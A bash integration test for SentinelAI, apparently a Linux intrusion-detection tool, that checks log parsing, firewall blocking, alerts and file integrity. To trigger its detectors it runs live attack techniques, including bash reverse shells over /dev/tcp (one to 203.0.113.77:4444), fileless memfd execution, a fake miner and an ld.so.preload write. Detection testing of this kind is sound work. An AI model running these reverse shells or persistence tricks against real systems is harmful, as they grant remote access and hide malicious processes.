#!/usr/bin/env bash
# Linux-only checks. Run through docker/test.Dockerfile, not on a real host:
# it adds firewall rules, creates and locks users, and kills processes.
set -uo pipefail

cd "$(dirname "${BASH_SOURCE[0]}")/../.."

SENTINELAI_HOME="$(mktemp -d)"
export SENTINELAI_HOME
cp -r config "$SENTINELAI_HOME/config"
sed -i -e 's/^interval_sec = 30 /interval_sec = 1 /' -e 's/^process_interval_sec = 2 /process_interval_sec = 0.5 /' \
    -e 's/^integrity_interval_sec = 60 /integrity_interval_sec = 1 /' \
    "$SENTINELAI_HOME/config/sentinelai.toml"

DATA="$SENTINELAI_HOME/data"
EVENTS="$DATA/events.jsonl"
FAILURES=0
PIDS=()

pass() { echo "PASS  $1"; }
fail() { echo "FAIL  $1"; FAILURES=$((FAILURES + 1)); }
check() { if eval "$2"; then pass "$1"; else fail "$1"; fi; }

stop_all() {
    for pid in "${PIDS[@]:-}"; do
        [[ -n "$pid" ]] && kill -- "-$pid" 2>/dev/null
    done
    PIDS=()
    sleep 0.4
}
trap stop_all EXIT

start() {
    setsid "$@" &
    PIDS+=("$!")
}

wait_until() {
    local tries=0
    until eval "$1"; do
        tries=$((tries + 1))
        (( tries > 80 )) && return 1
        sleep 0.25
    done
}

fresh_data() { rm -rf "$DATA" "$SENTINELAI_HOME/logs"; mkdir -p "$DATA/state"; touch "$EVENTS"; }
stamp() { date -u +%Y-%m-%dT%H:%M:%SZ; }
count() { grep -c "$1" "$EVENTS"; }
has() { grep -q "$1" "$EVENTS"; }
# Print a field of the first event matching a pattern.
field() { grep "$1" "$EVENTS" | head -1 | python -c "import json,sys; e=json.loads(sys.stdin.readline()); print(eval(sys.argv[1], {'e': e}))" "$2"; }

echo "== static checks"
for script in daemon/*.sh responder/*.sh utils/*.sh tests/linux/*.sh; do
    check "bash -n $script" "bash -n '$script'"
done
check "shellcheck" "shellcheck -x -S warning -e SC2153,SC2034,SC1091 daemon/*.sh responder/*.sh utils/*.sh"
check "scripts start with a clean shebang" "! grep -L '^#!/usr/bin/env bash$' daemon/*.sh responder/*.sh utils/setup.sh | grep ."

echo "== log_monitor"
fresh_data
AUTH="$(mktemp)"
export AUTH_LOG="$AUTH"
echo "$(stamp) h sshd[1]: Failed password for root from 203.0.113.99 port 1 ssh2" >>"$AUTH"
start python -m collectors.log_monitor
sleep 1.5
{
    echo "$(stamp) h sshd[1]: Failed password for root from 203.0.113.5 port 5555 ssh2"
    echo "$(stamp) h sshd[1]: Failed password for invalid user x from 8.8.8.8 port 1 ssh2 from 203.0.113.7 port 5557 ssh2"
    echo "$(stamp) h sshd[1]: message repeated 2 times: [ Failed password for root from 203.0.113.9 port 5559 ssh2]"
    echo "$(stamp) h sshd[1]: Failed password for root from 2001:db8::5 port 5560 ssh2"
    printf '%s h sshd[1]: Failed password for invalid user ta\tb"q\\ from 203.0.113.10 port 5561 ssh2\n' "$(stamp)"
    echo "$(stamp) h sshd[1]: Accepted publickey for alice from 203.0.113.11 port 5562 ssh2: RSA SHA256:abc"
    echo "$(stamp) h useradd[42]: new user: name=evil, UID=0, GID=0, home=/root, shell=/bin/bash, from=none"
    echo "$(stamp) h sudo:  alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/echo Failed password for root from 8.8.4.4 port 22 ssh2"
    echo "$(stamp) h myapp[9]: Failed password for root from 8.8.4.4 port 22 ssh2"
    echo "$(stamp) h sshd[1]: Invalid user oracle from 203.0.113.20 port 41000"
} >>"$AUTH"
wait_until "[[ \$(wc -l <'$EVENTS') -ge 10 ]]"
check "every real line produced an event, and nothing else did" "[[ \$(wc -l <'$EVENTS') -eq 10 ]]"
check "all events are valid JSON" "python -c \"import json; [json.loads(l) for l in open('$EVENTS')]\""
check "what was in the log before the first start is not news" "! has 203.0.113.99"
check "spoofed address in a username is ignored" "has '\"ip\":\"203.0.113.7\"' && ! has '\"ip\":\"8.8.8.8\"'"
check "a sudo command cannot pose as sshd" "! has '\"ip\":\"8.8.4.4\"'"
check "repeated message counts both attempts" "[[ \$(count 203.0.113.9) -eq 2 ]]"
check "IPv6 source" "has 2001:db8::5"
check "control characters and quotes survive" "has 203.0.113.10"
check "a key-only probe is seen" "has auth_probe"
check "UID is numeric" "[[ \$(field '\"user_add\"' \"e['meta']['uid']\") == 0 ]]"
stop_all

echo "== log_monitor across downtime and rotation"
echo "$(stamp) h sshd[1]: Failed password for root from 203.0.113.60 port 1 ssh2" >>"$AUTH"
start python -m collectors.log_monitor
wait_until "has 203.0.113.60"
check "a line written during downtime is read on return" "has 203.0.113.60"

mv "$AUTH" "$AUTH.1"
echo "$(stamp) h sshd[1]: Failed password for root from 203.0.113.61 port 1 ssh2" >>"$AUTH.1"
: >"$AUTH"
echo "$(stamp) h sshd[1]: Failed password for root from 203.0.113.62 port 1 ssh2" >>"$AUTH"
wait_until "has 203.0.113.62"
check "the file after a rotation is followed" "has 203.0.113.62"
check "the last lines of the rotated file are not lost" "has 203.0.113.61"

: >"$AUTH"
wait_until "has log_cleared"
check "a log cleared in place is reported" "has log_cleared"
stop_all

echo "== log_monitor speed"
fresh_data
: >"$AUTH"
rm -f "$DATA/state/offset_log_monitor.json"
start python -m collectors.log_monitor
sleep 1.5
SPEED_START=$(date +%s.%N)
python - "$AUTH" <<'PY'
import datetime, sys
line = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
with open(sys.argv[1], "a") as handle:
    handle.write(f"{line} h sshd[1]: Failed password for root from 203.0.113.70 port 1 ssh2\n" * 20000)
PY
wait_until "[[ \$(wc -l <'$EVENTS') -ge 20000 ]]"
RATE=$(python -c "import sys,time; print(int(20000/(time.time()-float(sys.argv[1]))))" "$SPEED_START")
echo "      $RATE lines per second"
check "keeps up with a real attack (bash managed 175 a second)" "[[ $RATE -gt 2000 ]]"
stop_all
unset AUTH_LOG

echo "== log_monitor with nothing to read"
AUTH_LOG=/nonexistent python -m collectors.log_monitor
check "exits with the unavailable code" "[[ $? -eq 3 ]]"

echo "== host_monitor: listeners"
fresh_data
nc -l -p 45001 >/dev/null 2>&1 &
BASE_LISTENER=$!
sleep 0.3
start python -m collectors.host_monitor
wait_until "[[ -s '$DATA/state/listening_ports.json' ]]"
check "first run records a silent baseline" "! has new_port"

nc -l -p 45002 >/dev/null 2>&1 &
NEW_LISTENER=$!
nc -l -s 127.0.0.1 -p 45003 >/dev/null 2>&1 &
LOCAL_LISTENER=$!
wait_until "has '\"port\":45002' && has '\"port\":45003'"
check "a new listener is reported" "has '\"port\":45002'"
check "the baseline listener stays quiet" "! has '\"port\":45001'"
check "the event names the process" "[[ \$(field '\"port\":45002' \"e['meta']['proc']\") == nc ]]"
check "it is marked as reachable from outside" "[[ \$(field '\"port\":45002' \"e['meta']['exposed']\") == True ]]"
check "a loopback listener is marked as local" "[[ \$(field '\"port\":45003' \"e['meta']['exposed']\") == False ]]"
check "the bind address is not reported as a source ip" "! grep '\"port\":45002' '$EVENTS' | grep -q '\"ip\":'"
check "metrics rows are written" "[[ \$(wc -l <'$DATA/resource_metrics.csv') -ge 2 ]]"
kill "$BASE_LISTENER" "$NEW_LISTENER" "$LOCAL_LISTENER" 2>/dev/null
stop_all

echo "== host_monitor: real attack techniques"
fresh_data
start python -m collectors.host_monitor
wait_until "[[ -s '$DATA/resource_metrics.csv' ]]"

nc -l -p 45010 >/dev/null 2>&1 &
CATCHER=$!
sleep 0.2
bash -c 'exec bash -i >& /dev/tcp/127.0.0.1/45010 0>&1' 2>/dev/null &
wait_until "has reverse_shell"
check "a real reverse shell is seen" "has reverse_shell"
check "it is reported as bash" "[[ \$(field reverse_shell \"e['meta']['proc']\") == bash ]]"

bash -c 'sleep 20; bash -i >& /dev/tcp/203.0.113.77/4444 0>&1' &
ONE_LINER=$!
wait_until "has reverse_shell_dev_tcp"
check "a reverse shell one-liner is recognised" "has reverse_shell_dev_tcp"
check "the technique comes with it" "[[ \$(field reverse_shell_dev_tcp \"e['meta']['mitre'][0]\") == T1059.004 ]]"

cp "$(command -v bash)" /tmp/nginx
/tmp/nginx -c 'sh -c "sleep 20; true"; true' &
FAKE_SERVER=$!
wait_until "has webshell_spawn"
check "a web server starting a shell is seen" "has webshell_spawn"
check "the parent is named" "[[ \$(field webshell_spawn \"e['meta']['parent']\") == nginx ]]"
check "a binary running from /tmp is seen" "grep temp_binary '$EVENTS' | grep -q nginx"

cp "$(command -v sleep)" /root/selfdeleter
/root/selfdeleter 20 &
GONE=$!
sleep 0.1
rm -f /root/selfdeleter
wait_until "has deleted_binary"
check "a binary deleted while running is seen" "grep deleted_binary '$EVENTS' | grep -q selfdeleter"

python - <<'PY' &
import os
fd = os.memfd_create("payload")
os.write(fd, open("/bin/sleep", "rb").read())
os.execv(f"/proc/self/fd/{fd}", ["payload", "20"])
PY
MEMORY=$!
wait_until "has fileless_process"
check "a process with no file on disk is seen" "has fileless_process"

cp "$(command -v sleep)" /tmp/xmrig
/tmp/xmrig 20 &
MINER=$!
wait_until "grep suspicious_proc '$EVENTS' | grep -q xmrig"
check "a miner is flagged as malicious" "grep suspicious_proc '$EVENTS' | grep xmrig | grep -q malicious"
kill "$CATCHER" "$ONE_LINER" "$FAKE_SERVER" "$GONE" "$MEMORY" "$MINER" 2>/dev/null
rm -f /tmp/nginx /tmp/xmrig
check "every event is valid JSON" "python -c \"import json; [json.loads(l) for l in open('$EVENTS')]\""
stop_all

echo "== file permissions"
fresh_data
PERM_LOG="$(mktemp)"
AUTH_LOG="$PERM_LOG" timeout 20 python sentinel.py run --no-dashboard --duration 3 >/dev/null 2>&1
check "the data folder is private" "[[ \$(stat -c '%a' '$DATA') == 700 ]]"
check "the logs folder is private" "[[ \$(stat -c '%a' '$SENTINELAI_HOME/logs') == 700 ]]"
check "no data file can be read by others" "[[ -z \$(find '$DATA' '$SENTINELAI_HOME/logs' -type f -perm /077) ]]"

echo "== full stack through the daemon script"
fresh_data
STACK_AUTH="$(mktemp)"
AUTH_LOG="$STACK_AUTH" bash daemon/sentinel_daemon.sh --no-dashboard --duration 12 >/dev/null 2>&1 &
STACK=$!
sleep 4
for attempt in 1 2 3 4 5 6; do
    echo "$(stamp) h sshd[1]: Failed password for root from 203.0.113.44 port 5$attempt ssh2" >>"$STACK_AUTH"
done
wait_until "grep -q block_ip '$DATA/threats.jsonl' 2>/dev/null"
check "a real log line becomes a block recommendation" "grep -q '203.0.113.44' '$DATA/threats.jsonl'"
wait_until "grep -q dry_run '$DATA/audit.jsonl' 2>/dev/null"
check "the responder recorded a dry run" "grep -q '\"status\":\"dry_run\"' '$DATA/audit.jsonl'"
check "dry-run left the firewall alone" "! nft list tables 2>/dev/null | grep -q sentinelai"
check "metrics were collected" "[[ \$(wc -l <'$DATA/resource_metrics.csv') -ge 2 ]]"
wait "$STACK"
check "the stack exits cleanly" "[[ $? -eq 0 ]]"
sleep 1
check "shutdown leaves no orphaned processes" "! pgrep -f 'collectors\\.|analyzer\\.|responder\\.' >/dev/null"
check "supervisor state shows stopped" "grep -q '\"state\": \"stopped\"' '$DATA/state/supervisor.json'"
check "the audit log verifies" "python sentinel.py audit >/dev/null"

echo "== enforce mode against a real attacker process"
fresh_data
sed -i 's/^run_mode = "dry-run"/run_mode = "enforce"/' "$SENTINELAI_HOME/config/sentinelai.toml"
useradd -M attacker 2>/dev/null
ENFORCE_AUTH="$(mktemp)"
AUTH_LOG="$ENFORCE_AUTH" python sentinel.py run --no-dashboard --duration 25 >/dev/null 2>&1 &
STACK=$!
wait_until "[[ -s '$DATA/state/listening_ports.json' ]]"

setsid su attacker -s /bin/sh -c 'exec nc -l -p 4444' >/dev/null 2>&1 &
wait_until "grep -q 'process killed' '$DATA/audit.jsonl' 2>/dev/null"
check "a real backdoor is killed by the running stack" "grep -q 'process killed' '$DATA/audit.jsonl'"
check "it is really gone" "! pgrep -f 'nc -l -p 4444' >/dev/null"
check "evidence was saved first" "ls '$DATA/evidence'/*.json >/dev/null 2>&1"

for attempt in 1 2 3 4 5 6; do
    echo "$(stamp) h sshd[1]: Failed password for root from 203.0.113.55 port 6$attempt ssh2" >>"$ENFORCE_AUTH"
done
wait_until "nft list set inet sentinelai blocked4 2>/dev/null | grep -q 203.0.113.55"
check "a real log line becomes a real firewall block" "nft list set inet sentinelai blocked4 2>/dev/null | grep -q 203.0.113.55"

nc -l -p 4445 >/dev/null 2>&1 &
ROOT_TOOL=$!
wait_until "grep -q 'owned by protected user root' '$DATA/audit.jsonl' 2>/dev/null"
check "a root process is refused, not killed" "grep -q 'owned by protected user root' '$DATA/audit.jsonl'"
check "and it is still running" "kill -0 $ROOT_TOOL 2>/dev/null"
kill "$ROOT_TOOL" 2>/dev/null
wait "$STACK"
sed -i 's/^run_mode = "enforce"/run_mode = "dry-run"/' "$SENTINELAI_HOME/config/sentinelai.toml"
nft delete table inet sentinelai 2>/dev/null
userdel attacker 2>/dev/null

echo "== file integrity on real files"
fresh_data
touch /etc/ld.so.preload.keep
start python -m collectors.file_monitor
wait_until "[[ -s '$DATA/state/file_baseline.json' ]]"
echo '# planted' >>/etc/hosts
wait_until "has /etc/hosts"
check "a changed hosts file is seen" "grep file_change '$EVENTS' | grep -q /etc/hosts"
useradd -M intruder
wait_until "has /etc/passwd"
check "a change to the account database is seen" "has /etc/passwd"
echo '/tmp/evil.so' >/etc/ld.so.preload
wait_until "has ld.so.preload"
check "a linker preload is seen" "has ld.so.preload"
rm -f /etc/ld.so.preload /etc/ld.so.preload.keep
userdel intruder 2>/dev/null
stop_all

echo "== notifications"
fresh_data
python - <<'PY' &
import http.server, json, os
class Hook(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers["Content-Length"]))
        with open(os.environ["SENTINELAI_HOME"] + "/received.json", "ab") as handle:
            handle.write(body + b"\n")
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args):
        pass
http.server.HTTPServer(("127.0.0.1", 49100), Hook).serve_forever()
PY
HOOK=$!
sleep 0.5
sed -i 's|^webhook_url = ""|webhook_url = "http://127.0.0.1:49100/hook"|' "$SENTINELAI_HOME/config/sentinelai.toml"
check "the test command reaches a real endpoint" "python sentinel.py notify-test | grep -q 'webhook: sent'"
NOTIFY_AUTH="$(mktemp)"
AUTH_LOG="$NOTIFY_AUTH" python sentinel.py run --no-dashboard --duration 12 >/dev/null 2>&1 &
STACK=$!
sleep 5
for attempt in 1 2 3 4 5 6; do
    echo "$(stamp) h sshd[1]: Failed password for root from 203.0.113.66 port 7$attempt ssh2" >>"$NOTIFY_AUTH"
done
wait_until "grep -q 203.0.113.66 '$SENTINELAI_HOME/received.json' 2>/dev/null"
check "a real attack reaches the webhook" "grep -q 203.0.113.66 '$SENTINELAI_HOME/received.json'"
wait "$STACK"
kill "$HOOK" 2>/dev/null
sed -i 's|^webhook_url = .*|webhook_url = ""|' "$SENTINELAI_HOME/config/sentinelai.toml"

echo "== real enforcement"
python tests/linux/enforce_check.py
[[ $? -eq 0 ]] && pass "enforcement checks" || fail "enforcement checks"

echo
if (( FAILURES > 0 )); then
    echo "$FAILURES check(s) failed"
    exit 1
fi
echo "All Linux checks passed"
